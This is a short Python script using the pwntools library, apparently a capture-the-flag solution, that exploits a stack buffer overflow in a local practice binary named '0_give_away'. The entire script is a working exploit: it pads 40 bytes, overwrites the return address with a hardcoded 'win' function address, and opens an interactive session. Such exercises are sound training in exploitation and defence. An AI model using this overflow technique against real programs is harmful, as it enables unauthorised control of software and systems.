from pwn import *

p = process('./0_give_away')

offset = 40
win_func = 0x00000000004006a7

payload = cyclic(offset)
payload += p64(win_func)

p.sendline(payload)
p.interactive()
